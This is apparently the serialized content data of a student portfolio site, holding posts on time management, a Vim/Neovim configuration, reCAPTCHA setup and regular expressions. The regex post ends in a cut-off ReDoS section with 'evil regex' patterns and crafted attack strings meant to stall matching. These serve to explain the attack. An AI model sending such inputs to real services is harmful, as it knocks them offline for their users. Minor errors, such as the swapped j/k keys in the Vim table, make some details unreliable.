Academy](https:\u002F\u002Fwww.khanacademy.org\u002Fmath\u002Fstatistics-probability)\n\n[investopedia](https:\u002F\u002Fwww.investopedia.com\u002Fterms\u002Fn\u002Fnormaldistribution.asp)\n\n[statology](https:\u002F\u002Fwww.statology.org\u002Fcomparing-z-scores\u002F)\n\n[investopedia](https:\u002F\u002Fwww.investopedia.com\u002Fterms\u002Fe\u002Fempirical-rule.asp)\n\n[sphweb.bumc.bu.edu](https:\u002F\u002Fsphweb.bumc.bu.edu\u002Fotlt\u002Fmph-modules\u002Fbs\u002Fbs704_summarizingdata\u002Fbs704_summarizingdata7.html)\n\n[medium](https:\u002F\u002Fmedium.com\u002Fi-math\u002Fcombinations-permutations-fa7ac680f0ac)\n\n[seeing-theory.brown.edu](https:\u002F\u002Fseeing-theory.brown.edu\u002Fbasic-probability\u002Findex.html)\n",readingTime:"12 min read"},{slug:"other_time-management",description:"How to manage time and make priorities",id:j,title:"Time Management -            plangroup. student+",duration:x,image:"\u002Fimages\u002Fprojects\u002Fminor\u002Ftime-management.png",tech:[{name:"time management"}],category:[{name:c},{name:b}],author:{name:d,image:e,social:{twitter:f}},createdAt:"2021-11-10T00:00:00.000Z",dir:o,path:"\u002Fprojects\u002Fother\u002Ftime-management",extension:g,updatedAt:a,bodyPlainText:"\n# Time Management \nBecause I wanted to learn an awful lot this semester, it was very important to have a tight schedule. Dividing the time and setting priorities was very important. Unfortunately, I could not do this alone so I joined the student+ plangroup. This plangroup is an after-school activity where you get tips on how to achieve your goals and set priorities. \n\nDuring the lessons, different models were used. For me, the eisenhower model was the best fit with my goals. \n\n## Eisenhower model\n\nEisenhower's productivity strategy is known as the Eisenhower Model. It is a simple way to be smart about your life goals, your (long-term) planning and your (daily) tasks. It's all about prioritizing, making decisions and the difference between urgent and important.\n\n### Urgent as well as important. (Do it)\nTasks that you perform as quickly as possible because otherwise (big) problems will arise. Really urgent ad hoc tasks also fall under this category. For a regular office worker this category of tasks should not take up more than **5%** of the task list and time. They are your so-called 'Most Important Tasks\n\n### Important, but not urgent. (Schedule it)\nTasks that you schedule to be done at a later time. These are the tasks that, as a time management master, you want to spend **95%** of your day on.\n\n### Urgent, but not important. (Delegate it)\nTasks you delegate to others if possible.\n\n### Neither urgent nor important. (Delete it)\nTasks you cross off your list, especially during busy periods where higher priorities demand your attention.\n\n\u003Ca href=\"\u002Fimages\u002Fprojects\u002Fother\u002Feisenhower_matrix.png\" target=\"_blank\" rel=\"some text\"\u003E\n  \u003Cimg width=\"80%\" src=\"\u002Fimages\u002Fprojects\u002Fother\u002Feisenhower_matrix.png\" alt=\"Eisenhower Matrix\"\u002F\u003E\n\u003C\u002Fa\u003E\n\nPrioritization of tasks by urgency and importance results in 4 quadrants with different work strategies:\n\n1. Important and urgent: do it now!\n2. Important but not urgent: put on your to do list!\n3. Urgent but not important: delegate!\n4. Not urgent not important: forget; comes later!\n\n## How to use \n\n- Putting things to-do on a list frees your mind. But always question what is worth doing first.\n- Try limiting yourself to no more than eight tasks per quadrant. Before adding another one, complete the most important one first. Remember: It is not about collecting but finishing tasks.\n- You should always maintain only one list for both business and private tasks. That way you will never be able to complain about not having done anything for your family or yourself at the end of the day.\n- Do not let you or others distract you. Do not let others define your priority. Plan in the morning, then work on your stuff. And in the end, enjoy the feeling of completion.\n- Finally, try not to procrastinate that much. Not even by over-managing your to-dos.\n",readingTime:B},{slug:"other_vim",description:"What is vim and why should you use it as a professional",id:j,title:"Vim",duration:x,image:"\u002Fimages\u002Fprojects\u002Fother\u002Ftime-management.jpg",tech:[{name:"vim"},{name:"ide"}],category:[{name:c},{name:b}],author:{name:d,image:e,social:{twitter:f}},github:"https:\u002F\u002Fgithub.com\u002Frikp777\u002F.dotfiles\u002Ftree\u002Fmaster\u002Fnvim\u002F.config\u002Fnvim",createdAt:"2021-12-08T00:00:00.000Z",dir:o,path:"\u002Fprojects\u002Fother\u002Fvim",extension:g,updatedAt:a,bodyPlainText:"\n# Vim (IDE)\n\nThere's a reason why, after decades, countless developers still prefer Vim as their code editor of choice. That many people can't be wrong, right? Vim is a  free open source software. My first experience with Vim was when I accidentally entered it and could not get out. I had to google [how to exit vim](https:\u002F\u002Fstackoverflow.com\u002Fquestions\u002F11828270\u002Fhow-do-i-exit-the-vim-editor) to escape. I asked, *\"why would anyone ever use this awful editor?\"* Fast forward 4 years, this awful editor is now my primary editor. I've tried editors like *Notepad++, Atom, Intellij and VSCode*\n\nThis semester enabled me to make the switch to this environment. This did not work out last semester because there is a very intensive learning curve to learning vim. \n\nI think a great editor needs to have these three features:\n\n- Extensibility\n- Community\n- Composability\n- Intelligent code completion\n\nVim is what I use because it has all four of the capabilities listed above. Allow me to explain each one.\n\n## Extensibility\n\nIf you've used VSCode, Atom, or Sublime, then you know being able to add and remove plugins easily is an indispensable feature. This functionality is also provided by vim but that's not all because vim allows you to choose your own plugin manager according to your needs. In my environment I use packer. \n\n## Community\n\nIn open source technology, the community is very crucial. As long as there are enough contributing developers, a vibrant community assures continual development and problem fixes. More community plugins, tutorials, and human help are all part of the equation. The Vim community is quite active. It has a reddit page, a stackexchange account, and a number of specialized twitter accounts, among other things. I personally learned a lot from the vim master ThePrimeagen on youtube and twitch.\n\n## Composability\n\nIn addition to extensibility and community, Vim features composability, which I believe is a trait that many non-modal editors lack.\n\nCompo..what?\n\nComposability refers to the ability to combine a set of generic instructions to achieve more complicated tasks. In the same way that you can make complicated abstractions out of smaller abstractions in programming, you can run complex commands out of simpler ones in Vim. Vim contains movement motions and editing operators (there are also text objects, but I won't go over them here).\n\n## Intelligent code completion\n\nIntelligent code completion is a context-aware code completion function in various programming environments that reduces typos and other typical errors to speed up the writing process. Attempts at this are often made by using auto-completion popups while typing, querying function arguments, and query tips for syntax mistakes. Reflection is used to provide documentation and disambiguation for variable names, functions, and methods utilizing intelligent code completion and associated technologies. also for this complexity, vim has several plugins that can support you with this. \n\n# Learning curve\n\nit's not a curve it's a wall, but if you break it you'll earn your geekhood!\n\nIf you use vim all day and make an effort to use it well, you’ll be editing code faster than you did in your old editor within two weeks. Learning vim is like this. At first, you do everything as simply as possible. Then you start to wonder if there are faster ways to get things done, and there are! If you chain those commands together they just work! You bump into things accidentally, or maybe you spend some time in the extensive help files.\n\nThe hardest thing is all the key combinations possible within vim. \n\nThis can be very overwhelming but it is not at all necessary to learn all the key combinations at once with as many as 10 combinations you can use all of vim already!\n\nOnce you are in the eqos system of vim there is no going back just like apple. \n\n## What is Neovim?\n\nButtt..... let's bring neovim in to the picture \n\nNeovim is a community-driven open source project and a fork of the Vim text editor designed to make Vim's core developers' lives simpler. It's an upgraded Vim text editor out of the box, or to put it another way, it's a more streamlined Vim that makes integrations lot easier than Vim. Vim is already the most popular text editor and the text editor of choice for programmers. Consider Neovim to be the Vim editor of the future, aiming to remedy some of the shortcomings of its predecessor. For one thing, building plug-ins proved difficult, and Vim isn't well-suited to current systems. So, Neovim fixes the issues you were having with Vim. Neovim improves on Vim by providing a totally redesigned plug-in architecture, a better GUI ecosystem, first-class embedding support, and more.\n\nDuring my introduction to neovim I found out that neovim and the community were in transition this made the learning process super convenient. This transition took place through the introduction of lua files. A lua file contains [source code](https:\u002F\u002Ftechterms.com\u002Fdefinition\u002Fsourcecode) written in Lua, a light-weight programming language designed for extending or adding functionality to software applications. The Lua scripting language [syntax](https:\u002F\u002Ftechterms.com\u002Fdefinition\u002Fsyntax) is simple but supports a large number of [data types](https:\u002F\u002Ftechterms.com\u002Fdefinition\u002Fdatatype) and operators. Lua is very weel integrated with Neovim, and with LuaJIT, it is much faster than vimscript. If you, like me, never really understood Vimscript and hate the language with a passion because like I told before its really difficult to integrate. \n\nLet's talk about lua files.\n\nLet's take the following folder structure as an example:\n\n``` \n📂 ~\u002F.config\u002Fnvim\n├── 📁 plugins\n├── 📂 lua\n│  └── 📂 setup_plugins\n|  ├── 🌑 plugin_manager.lua\n|  ├── 🌑 mappings.lua\n│  └── 🌑 settings.lua\n└── 🇻 init.lua (or) init.vim\n```\n\nnvim has no fixed folder structure but I personally find this the most logical structure for my needs. My init file is my main file as with many languages it is the starting point. From here I put references to different sub folders that all have their own domain.\n\nIn my settings I set all preferences like font type colors but also tab spacing. My plugin manager is the place where I indicate which plugins I would like to use within my environment. my mapping allows me to create different keybindings.  \n\nThere are still an awful lot of things you can make especially with the integration with lua files, but I'm not working on this at the moment. \n\nBelow is a link pointing to my .dotfiles containing my configuration of nvim. \n\n[.config\u002Fnvim](https:\u002F\u002Fgithub.com\u002Frikp777\u002F.dotfiles\u002Ftree\u002Fmaster\u002Fnvim\u002F.config\u002Fnvim)\n\n## How I started:\n\nMy learning process began with configuring a my own vim script. All the steps I took and notes are below.\n\nset theme \n\ncd ~\u002F.vim \t\tor if non existent \tmkdir ~\u002F.vim\n\ncd ~\u002F.vim\n\nmkdir colors\n\ncd colors \n\nwget https:\u002F\u002Fraw.githubusercontent.com\u002Fgosukiwi\u002Fvim-atom-dark\u002Fmaster\u002Fcolors\u002Fatom-dark.vim\n\ncd ..\n\ngit clone https:\u002F\u002Fgithub.com\u002FVundleVim\u002FVundle.vim.git ~\u002F.vim\u002Fbundle\u002FVundle.vim\n\n\n\n.vimrc root directory \n\n:e ~ .\u002Fvimrc\n\n\n\nplugins.vim\n\n```\nfiletype off\t\t\t\t\n\n\nset rp+=~\u002F.vim\u002Fbundle\u002FVundle.vim \t\t\t\t\t\t\"set the runtime path to include Vundle an initialize\"\ncall vundle#begin()\n\n\n\"--- --- --- --- Plugins --- --- --- ---\"\nPlugin 'VundleVim\u002FVundle.vim'\nPlugin 'tpope\u002Fvim-vinegar'\nPlugin 'scrooloose\u002Fnerdtree'\nPlugin 'ctrlpvim\u002Fctrlp.vim'\nPlugin 'rking\u002Fag.vim'\nPlugin 'skwp\u002Fgreplace.vim'\n\n\n\"All of your plugins must be added before the folling line\"\ncall vundle#end()\nfiltetype plugin indent on \n```\n\nvimrc\n\n``` \nset nocompatible \t\t\t\t\t\t\t\t\t\t\"We want the latest Vim settings\u002Foptions\"\n\n\nso ~\u002F.vim\u002Fplugins.vim\t\t\t\t\t\t\t\t\t\"Import plugins file\"\n\n\n\n\nsyntax enable \nset backspace = indent,eol,start\t\t\t\t\t\t\"Make backspace heave like every other editor.\"\nlet mapleader = ','\t\t\t\t\t\t\t\t\t\t\"The default leader is \\, but a comma is much better\"\nset number \t\t\t\t\t\t\t\t\t\t\t\t\"Let's activate line numbers.\"\n\n\n\"--- --- --- --- Visuals --- --- --- ---\"\ncolorscheme atom-dark\nset t_CO = 256\t\t\t\t\t\t\t\t\t\t\t\"Use 256 colors. This is useful for Terminal Vim\"\nset guifont = Fira_Code:h16 \t\t\t\t\t\t\t\"Set the default font family and size\"\nset macligatures\t\t\t\t\t\t\t\t\t\t\"We want pretty symbols, when available\"\nset guioptions-=e\t\t\t\t\t\t\t\t\t\t\"We don't want Gui tabs\"\nset linespace = 15 \t\t\t\t\t\t\t\t\t\t\"Mavim-specific line-height\"\n\nset guioptions -=l\t\t\t\t\t\t\t\t\t\t\"Disable Gui scrollbars.\"\nset guioptions -=L\nset guioptions -=l\nset guioptions -=R\n\nhi LineNr guibg=bg\nset foldcolumn = 2\t\t\t\t\t\t\t\t\t\t\"We'll fake a custom left padding for each window\"\nhi foldcolumn guibg = bg\n\nhi vertsplit guifg=bg guibg=bg\t\t\t\t\t\t\t\"get rid of ugly split borders\"\n\n\"--- --- --- --- Search --- --- --- ---\"\nset hlsearch\nset incsearch \n\n\"--- --- --- --- Split Management --- --- --- ---\"\nset splitbelow\nset splitright\n\nnmap \u003CC-J\u003E \u003CC-W\u003E\u003CC-J\u003E\nnmap \u003CC-K\u003E \u003CC-W\u003E\u003CC-K\u003E\nnmap \u003CC-H\u003E \u003CC-W\u003E\u003CC-H\u003E\nnamp \u003CC-L\u003E \u003CC-W\u003E\u003CC-L\u003E\n\n\"--- --- --- --- Mappings--- --- --- --- \"\nnmap \u003CLeader\u003Eev :tabedit $MYVIMRC\u003Ccr\u003E\t\t\t\t\t\"Make it easy to edit the Vimrc file\"\nnmap \u003CLeader\u003E\u003Cspace\u003E :nohlsearch\u003Ccr\u003E\t\t\t\t\t\"Add simple highlight removal\"\nnmap \u003CLeader\u003Ef :tag\u003Cspace\u003E\n\n\n\n\"--- --- --- --- Plugins --- --- --- ---\"\n\" \u002F\n\" \u002F CtrlP\"\n\" \u002F\nlet g:ctrlp_custom_ignore = 'node_modules\\DS_Store\\|git'\nlet g:ctrlp_match_window = 'top,order:ttb,min:1,max:30,results:30'\n\nnmap \u003CD-p\u003E :CtrlP\u003Ccr\u003E\nnmap \u003Cc-R\u003E :CtrlPBugTag\u003Ccr\u003E\nnmap \u003CD-e\u003E :CtrlPMRUFiles\u003Ccr\u003E\n\n\n\n\n\" \u002F\n\" \u002F NERDTree\n\" \u002F\nlet NerdTreeHijackNetrw = 0\n\n\"Make NERDTree easier to toggle\"\nnmap \u003CD-1\u003E :NERDTreeToggle\u003Ccr\u003E\n\n\n\" \u002F\n\" \u002F Greplace.vim\n\" \u002F\nset grepprg=ag \t\t\t\t\t\t\t\t\t\t\t\"We want to use Ag for the search\"\n\n\n\"------------Auto-Command------------\"\n\n\"Automatically source the Vimrc file on save\"\naugroup autosourcing \n\t\tautocmd! \n\t\tautocmd BufWritePost .vimrc source %\naugroup END\n\n\n\n\" Notes and Tips\n\" - Press 'zz' to instantly center the line where the cursor is located.\n\n\n\n```\n\n.gvimrc\n\n``` \n\"Disable the print key for Macvim\"\nif has(\"gui_macvim\")\n\tmacmenu &File.print key=\u003Cnop\u003E\nendif\n```\n\n:so %\t\tread and implement changes in vimrc   \t\t:so = source \t % = current file \n\nvtags \n\nmodes \n\n| Mode | Description                                |\n| ---- | ------------------------------------------ |\n| esc  | Normal mode                                |\n| I    | Insert mode \\| Insert new text to line     |\n| V    | Visual mode \\| selecting text and deleting |\n|      |                                            |\n\n| Key  | Description |\n| ---- | ----------- |\n| h    | left        |\n| j    | up          |\n| k    | down        |\n| l    | right       |\n\n\n\n|                  |           |\n| ---------------- | --------- |\n| :                | mode      |\n|                  |           |\n|                  |           |\n| :e .\u002F{directory} | edit      |\n|                  |           |\n|                  |           |\n| pwd              | Directory |\n\n",readingTime:"9 min read"},{slug:"software-engineering_captcha-mechanism",description:"What are they and how are they used",id:j,title:"Captcha Mechanism",duration:k,image:"\u002Fimages\u002Fprojects\u002Fminor\u002Frecaptcha.png",tech:[{name:"captcha"}],category:[{name:c},{name:m},{name:h},{name:b}],author:{name:d,image:e,social:{twitter:f}},createdAt:"2021-11-04T00:00:00.000Z",dir:N,path:"\u002Fprojects\u002Fsoftware-engineering\u002Fcaptcha-mechanism",extension:g,updatedAt:a,bodyPlainText:"\n# Captcha Mechanism \n\nWhat exactly is a captcha? Why does the owner of the site want you to fill in such a captcha? The answer is actually quite simple: you have to prove that you are a human being!\n\nScripts, which we also call bots or robots, are constantly scouring the Internet. Some of them provide information about a website to a search engine. But there are also bots that look for forms and fill them automatically with all kinds of garbage.\n\nTo prevent this robot\u002Fbot from simply clicking the submit button, a captcha is placed in the middle. This must first be completed correctly before the form can be submitted.\n\nSome examples of when to use a Captcha:\n\n- **Maintaining poll accuracy**\n- **Limiting registration for services**\n- **Preventing ticket inflation**\n- **Preventing false comments**\n\nCAPTCHA stands for: \n\n\"Completely Automated Public Turing test to tell Computers and Humans Apart.\"\n\n## Types\n\nThere are several captchas that can be implemented now a day such as:\n\n### reCAPTCHA v3\n\nreCAPTCHA v3 allows you to verify if an interaction is legitimate without any user interaction. It is a pure JavaScript API returning a score, giving you the ability to take action in the context of your site: for instance requiring additional factors of authentication, sending a post to moderation, or throttling bots that may be scraping content.\n\n### reCAPTCHA (v2)\n\n#### Visible \n\nThe \"I'm not a robot\" Checkbox requires the user to click a checkbox indicating the user is not a robot. This will either pass the user immediately (with No CAPTCHA) or challenge them to validate whether or not they are human. This is the simplest option to integrate with and only requires two lines of HTML to render the checkbox.\n\n#### Invisible \n\nThe invisible reCAPTCHA badge does not require the user to click on a checkbox, instead it is invoked directly when the user clicks on an existing button on your site or can be invoked via a JavaScript API call. The integration requires a JavaScript callback when reCAPTCHA verification is complete. By default only the most suspicious traffic will be prompted to solve a captcha. To alter this behavior edit your site security preference under advanced settings.\n\n### Visual captchas (v1)\n\nIn many cases the captchas are based on text, number combinations and characters that are difficult to recognize. A capcha is build a way that one user will never get the same captcha twice. There are also captchas that ask the user questions there are multiple types of question but most of them are based on image recognition. For example click all taxi's in the box below. Some characteristics are:\n\n- Letters and numbers are usually not nicely juxtaposed, but scattered across the screen.\n- The characters are not nicely straight, but rotated.\n- Different fonts (typefaces) are used.\n- A background image or different colors are used; almost never 1 color.\n\nv1 is not supported anymore since 2018 despite that many site still have this implementation. This implementation of captchas also ranked as most irritating among people. That's why there are new versions today that thoroughly address this problem.\n\n## Implementation \n\nThe first step is the simplest. Go to the [reCAPTCHA homepage ](https:\u002F\u002Fwww.google.com\u002Frecaptcha\u002Fintro\u002Findex.html)and click on the *Get reCAPTCHA* button at the top of the screen. On the next screen, you’ll find a prompt to enter a label and domain for your site, so you can identify it among your reCAPTCHA properties.\n\nPopulate both fields, click on *Register*, and you’re done. On the next screen, you’ll receive both a *Site Key* and a *Secret Key*.\n\n\n\n#### Front-end\n\nTo use reCaptcha I followed the documentation steps, but with the help of a package from yarn to vue, **vue-recaptcha**, which provides me with a basically ready component, just implement it and capture the event from validation you can see more about it\n\n##### Instalation\n\nyarn add vue-recaptcha-v3\nyarn add axios\n\nIn my **app.js** where I store my environment variables I will set the site key and url of my api, which in this case will be running on localhost\n\n```javascript\nimport Vue from 'vue'\nimport { VueReCaptcha } from 'vue-recaptcha-v3'\n\nVue.use(VueReCaptcha, { siteKey: '\u003Csite key\u003E' })\n\nnew Vue({\n  methods: {\n    async recaptcha() {\n      \u002F\u002F (optional) Wait until recaptcha has been loaded.\n      await this.$recaptchaLoaded()\n\n      \u002F\u002F Execute reCAPTCHA with action \"login\".\n      const token = await this.$recaptcha('login')\n\n      \u002F\u002F Do stuff with the received token.\n      console.log(token) \u002F\u002F Will print the token\n    }\n  },\n  template: '\u003Cbutton @click=\"recaptcha\"\u003EExecute recaptcha\u003C\u002Fbutton\u003E'\n})\n```\n\nEach reCAPTCHA user response token is valid for two minutes, and can only be verified *once* to prevent replay attacks. If you need a new token, you can re-run the reCAPTCHA verification.\n\nAfter you get the response token, you need to verify it within two minutes with reCAPTCHA using the following API to ensure the token is valid.\n\n##### API Request\n\nURL: https:\u002F\u002Fwww.google.com\u002Frecaptcha\u002Fapi\u002Fsiteverify \t\t\t\tMETHOD: POST\n\n| OST Parameter | Description                                                  |\n| :------------ | :----------------------------------------------------------- |\n| secret        | Required. The shared key between your site and reCAPTCHA.    |\n| response      | Required. The user response token provided by the reCAPTCHA client-side integration on your site. |\n| remoteip      | Optional. The user's IP address.                             |\n\n##### API Response \n\nThe response is a JSON object:\n\n```json\n{\n  \"success\": true|false,\n  \"challenge_ts\": timestamp,  \u002F\u002F timestamp of the challenge load (ISO format yyyy-MM-dd'T'HH:mm:ssZZ)\n  \"hostname\": string,         \u002F\u002F the hostname of the site where the reCAPTCHA was solved\n  \"error-codes\": [...]        \u002F\u002F optional\n}\n```\n\n\n\nDespite being under constant attack, CAPTCHAs remain a [wildly popular](https:\u002F\u002Ftrends.builtwith.com\u002Fwidgets\u002Fcaptcha) method of protection for websites. They’re definitely not the [only defense](http:\u002F\u002Fwww.creativebloq.com\u002Fweb-design\u002Fwebsite-security-tips-protect-your-site-7122853) you can implement, but they are one of the simplest and most efficient.\n\n# Evaluation \n\nI have come to know a lot about captcha for example i did not know that there were already newer versions available that eliminates the need to manually enter characters. This makes it much easier for the user and prevents Irritations especially with me personally. Overall I found it a very interesting topic.\n",readingTime:"5 min read"},{slug:"software-engineering_regular-expressions",description:"What are they and how to make one",id:j,title:"Regular expressions \"Regex\"",duration:k,image:"\u002Fimages\u002Fprojects\u002Fminor\u002Fregex.png",tech:[{name:"regex"}],category:[{name:c},{name:m},{name:h},{name:b}],author:{name:d,image:e,social:{twitter:f}},createdAt:"2021-11-06T00:00:00.000Z",dir:N,path:"\u002Fprojects\u002Fsoftware-engineering\u002Fregular-expressions",extension:g,updatedAt:a,bodyPlainText:"\n# Regular expressions\n\nRegular expressions are one of the most used programming functions. Almost all big programming languages such as Java, C# have them embedded in their language. \n\nBut before we go deeper in to the topic you first need to understand what a regular expression ( regex) is. Regex  is a character set witch describes certain patterns its is mostly used to match and locate text in a string. \n\nA regular expressions is a way to describe patterns. A computer can recognize these regular expressions and will be able to recognize text inside for example a document. You can for example use a regular expression to search through a text or check if an email-address is correctly formatted.\n\nThere are a lot of character used in a regular expression and it can be unreadable to the untrained eye.\n\n## Cheat sheet summary \n\nTo make a regex yourself you need to understand the list below. in doing so you have to understand what each character means and does. \n\n| Character   | Description |\n|-------------|-------------|\n| \\           | the escape character - used to find an instance of a meta character like a period, brackets, etc. |\n| .           | match any character except newline |\n| x           | match any instance of x |\n| ^x          | match any character except x |\n| [x]         | match any instance of x in the bracketed range - [abxyz] will match any instance of a, b, x, y, or z|\n| \\|           | an OR operator - [xꟾy] will match an instance of x or y |\n| () | used to group sequences of characters or matches |\n| {} | used to define numeric quantifiers |\n| {x} | match must occur exactly x times |\n| {x,} | match must occur at least x times |\n| {x,y} | match must occur at least x times, but no more than y times |\n| ? | preceding match is optional or one only, same as {0,1} |\n| * | find 0 or more of preceding match, same as {0,} |\n| + | find 1 or more of preceding match, same as {1,} |\n| ^ | match the beginning of the line |\n| $ | match the end of a line |\n|  |  |\n| [:alpha:] | Represents an alphabetic character. Use [:alpha:]+ to find one of them. |\n| [:digit:] | Represents a decimal digit. Use [:digit:]+ to find one of them. |\n| [:alnum:] | Represents an alphanumeric character ([:alpha:] and [:digit:]). |\n| [:space:] | Represents a space character (but not other whitespace characters). |\n| [:print:] | Represents a printable character. |\n| [:cntrl:] | Represents a nonprinting character. |\n| [:lower:] | Represents a lowercase character if Match case is selected in Options. |\n| [:upper:] | Represents an uppercase character if Match case is selected in Options. |\n|  |  |\n| \\d | matches a digit, same as [0-9] |\n| \\D | matches a non-digit, same as [^0-9] |\n| \\s | matches a whitespace character (space, tab, newline, etc.) |\n| \\S | matches a non-whitespace character |\n| \\w | matches a word character |\n| \\W | matches a non-word character |\n| \\b | matches a word-boundary (NOTE: within a class, matches a backspace) |\n| \\B | matches a non-wordboundary |\n\nass you can see its quite an extensive list of characters\n\nRegex is a realy powerfull tool to restrict string inputs \n\n| Description                   | Regex                           ||\n| ----------------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |\n| (1) Email address             | ^[\\w-]+(\\.[\\w-]+)*@([a-z0-9-]+(\\.[a-z0-9-]+)*?\\.[a-z]{2,6}\\|(\\d{1,3}\\.){3}\\d{1,3})(:\\d{4})?$ |                                                              |\n| (2) Email address             | ^[\\\\w\\\\-]+(\\\\.[\\\\w\\\\-]+)*@([A-Za-z0-9-]+\\\\.)+[A-Za-z]{2,4}$ |                                                              |\n| (3) Email address -           | ^([\\w\\.*\\-*]+@([\\w]\\.*\\-*)+[a-zA-Z]{2,9}(\\s*;\\s*[\\w\\.*\\-*]+@([\\w]\\.*\\-*)+[a-zA-Z]{2,9})*)$ | List of semi-colon seperated email addresses                 |\n| (4) Email adress              | ^([a-zA-Z0-9._%-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,4})*$   |                                                              |\n| Credit Cards                  | ^(?:4[0-9]{12}(?:[0-9]{3})?\\|5[1-5][0-9]{14}\\|6011[0-9]{12}\\|622((12[6-9]\\|1[3-9][0-9])\\|([2-8][0-9][0-9])\\|(9(([0-1][0-9])\\|(2[0-5]))))[0-9]{10}\\|64[4-9][0-9]{13}\\|65[0-9]{14}\\|3(?:0[0-5]\\|[68][0-9])[0-9]{11}\\|3[47][0-9]{13})*$ |                                                              |\n| IP Address                    | ^((?:(?:25[0-5]\\|2[0-4][0-9]\\|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]\\|2[0-4][0-9]\\|[01]?[0-9][0-9]?))*$ |                                                              |\n| Username                      | [^@\u002F]+@[^@\u002F]+                                          | of type test@test                                            |\n| Multiple spaces replacement   | \\\\\\s+                                                  |                                                              |\n| Non-alphanumeric replacement  | [^a-zA-Z0-9]                                           |                                                              |\n| Blank line                    | ^$                                                     |                                                              |\n| Positive integers             | ^[1-9]+[0-9]*$                                         |                                                              |\n| Positive decimal values       | (^\\d*\\.?\\d*[0-9]+\\d*$)\\|(^[0-9]+\\d*\\.\\d*$)              |                                                              |\n| Percentage (2 decimal places) | ^-?[0-9]{0,2}(\\.[0-9]{1,2})?$\\|^-?(100)(\\.[0]{1,2})?$   |                                                              |\n| State abbreviation            | [A-Z][A-Z]                                             | You may choose to put spaces either before or after the regex. |\n| Phone Numbers                 | (^\\+[0-9]{2}\\|^\\+[0-9]{2}\\(0\\)\\|^\\(\\+[0-9]{2}\\)\\(0\\)\\|^00[0-9]{2}\\|^0)([0-9]{9}$\\|[0-9\\-\\s]{10}$) |                                                              |\n|                               | ^((\\+\\|00(\\s\\|\\s?\\-\\s?)?)31(\\s\\|\\s?\\-\\s?)?(\\(0\\)[\\-\\s]?)?\\|0)[1-9]((\\s\\|\\s?\\-\\s?)?[0-9])((\\s\\|\\s?-\\s?)?[0-9])((\\s\\|\\s?-\\s?)?[0-9])\\s?[0-9]\\s?[0-9]\\s?[0-9]\\s?[0-9]\\s?[0-9]$ | 06 1234567 or +31(06) 123 45678                              |\n| City, State abbreviation      | .*, [A-Z][A-Z]                                         |                                                              |\n| Zip Code                      | [0-9]\\{5\\}(-[0-9]\\{4\\})?                               | US for example 84094 or 84094-1234                           |\n| Social security number,       | [0-9]\\{3\\}-[0-9]\\{2\\}-[0-9]\\{4\\}                       | such as: ###-##-####                                         |\n| Dollar amounts                | \\$[0-9]*.[0-9][0-9]                                    | specified with a leading $ symbol                            |\n| DATE                          | [0-9]\\{4\\}-[0-9]\\{2\\}-[0-9]\\{2\\}                       | 2003-08-06                                                   |\n|                               | [A-Z][a-z][a-z] [0-9][0-9]*, [0-9]\\{4\\}            | Jan 3, 2003                                                  |\n|                               | ^(\\d{1,2})\\\u002F(\\d{1,2})\\\u002F(\\d{2}\\|(19\\|20)\\d{2})$           | DD\u002FMM\u002FYY or DD\u002FMM\u002FYYYY or MM\u002FDD\u002FYY or MM\u002FDD\u002FYYYY             |\n| HTML Tags except              | \u003C(?\u003E\u002F?)(?!p).+?\u003E                                       | ```html \u003Cp\u003E \u003C\u002Fp\u003E ```                                         |\n| URL                           | ^http(s)?:\\\u002F\\\u002F((\\d+\\.\\d+\\.\\d+\\.\\d+)\\|(([\\w-]+\\.)+([a-z,A-Z][\\w-]*)))(:[1-9][0-9]*)?(\\\u002F([\\w-.\\\u002F:%+@&=]+[\\w- .\\\u002F?:%+@&=]*)?)?(#(.*))?$\u002Fi |                                                              |\n\nBy default the community made some standard expressions you can use for your goal so you don't have to create one yourself. But you must be able to understand what is being performed in such an expression.\n\n# Cyber \n\n## Denial of service attack (ReDoS)\n\nA denial of service attack is when an attacker makes an online service slow down or become unavailable to its users. \n\nDenial-of-service for regular expressions (ReDoS) is a denial-of-service attack that takes advantage of the fact that most implementations of regular expressions can get into extreme situations that make them work very slowly (exponentially depending on the input size). An attacker can use a [stripped down] regular expression to get a program into these extreme situations and then get stuck for a long time. \n\n### Evil Regex\n\nA regex pattern is known as a evil regex if it can get stuck in the generated input that is given.\n\nEvil regex contains :\n\n- Grouping with a lot of repetition\n- Inside of repetition group \n  - Again repetition (many nested repertitions)\n  - Alternation with overlapping\n\nsome examples \n\n- ```regex\n  ^(a+)+$\n  ```\n\n- ```regex\n  ([a-zA-Z]+)*\n  ```\n\n- ```regex\n  (a|aa)+\n  ```\n\n- ```regex\n  (a|a?)+\n  ```\n\n- ```regex\n  (.*a){x} for x \\\u003E 10\n  ```\n\n- ``` regex\n  \\^([a-zA-Z0-9])(([\\-.]|[_]+)?([a-zA-Z0-9]+))*(@){1}[a-z0-9]+[.]{1}(([a-z]{2,3})|([a-z]{2,3}[.]{1}[a-z]{2,3}))$ \n  ```\n\n\nThese regex expressions are all sensitive to the string input:\n- \t\t\taaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!\n\n```javascript\nvar validUrlRegex = \u002F^(https?:\\\u002F\\\u002F)?([\\da-z\\.-]+)\\.([a-z\\.]{2,6})([\\\u002F\\w \\.-]*)*\\\u002F?$\u002F\nvar url = 'https:\u002F\u002Fgoogle.com\u002F'\n\nconsole.time('regex evaluation time')\n\nif (url.match(validUrlRegex)) {\n  console.log(url + ' is a valid url')\n} else {\n  console.log(url + ' is not a valid url')\n}\n\nconsole.timeEnd('regex evaluation time')\n```\n\nThe output should be:\n\n```text\nhttps:\u002F\u002Fgoogle.com\u002F is a valid url\nregex evaluation time: 2ms\n```\n\nBut now consider to apply the regular expression on a bad url introduced in our code by an attacker.\n\n```javascript\nvar validUrlRegex = \u002F^(https?:\\\u002F\\\u002F)?([\\da-z\\.-]+)\\.([a-z\\.]{2,6})([\\\u002F\\w \\.-]*)*\\\u002F?$\u002F\nvar badUrl = 'https:\u002F\u002Fgoogle.com\u002Faaaaaaaaaaaaaaaaaaaaaaaa@'\n\nconsole.time('regex evaluation time')\n\nif (badUrl.match(validUrlRegex)) {\n  console.log(badUrl + ' is a valid url')\n} else {\n  console.log(badUrl + ' is not a valid url')\n}\n\nconsole.timeEnd('regex evaluation 